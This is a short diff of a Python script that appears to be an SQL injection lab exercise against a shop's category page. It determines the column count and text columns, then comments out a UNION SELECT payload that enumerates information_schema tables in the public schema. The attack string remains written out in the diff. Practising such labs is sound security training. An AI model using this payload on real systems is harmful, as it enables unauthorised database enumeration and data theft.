@@ -24,13 +24,14 @@ def main(args):
     text_columns = utils.determine_text_columns(
         shop.category_url, shop.no_proxy, num_columns
         )
-    nulls = ["NULL"] * num_columns
-    nulls[text_columns[0]] = "'a'"
-    nulls = ",".join(nulls)
-    resp = shop.get_category(
-        f"' UNION SELECT {nulls} from information_schema.tables where table_schema = 'public'-- "
-    )
-    print(resp.txt)
+    print(num_columns, text_columns)
+    #nulls = ["NULL"] * num_columns
+    #nulls[text_columns[0]] = "'a'"
+    #nulls = ",".join(nulls)
+    #resp = shop.get_category(
+    #    f"' UNION SELECT {nulls} from information_schema.tables where table_schema = 'public'-- "
+    #)
+    #print(resp.txt)
         
 
 
